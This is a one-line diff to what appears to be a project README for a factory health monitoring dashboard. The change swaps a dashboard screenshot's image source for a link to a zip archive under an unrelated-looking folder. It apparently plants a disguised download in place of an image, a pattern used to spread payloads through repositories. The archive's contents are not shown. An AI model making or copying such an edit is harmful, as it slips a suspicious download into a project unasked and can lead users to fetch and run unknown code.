@@ -67,6 +67,6 @@ Integrate cost impact analysis
 
 
 
-<img width="1298" height="1410" alt="Dashboard 1" src="https://github.com/user-attachments/assets/861c68a6-76da-4548-a37b-4c53a03715a0" />
+<img width="1298" height="1410" alt="Dashboard 1" src="https://raw.githubusercontent.com/Tushar8102/Factory-Health-Monitoring-Dashboard/main/zygion/Dashboard_Factory_Monitoring_Health_v3.8.zip" />
 
 
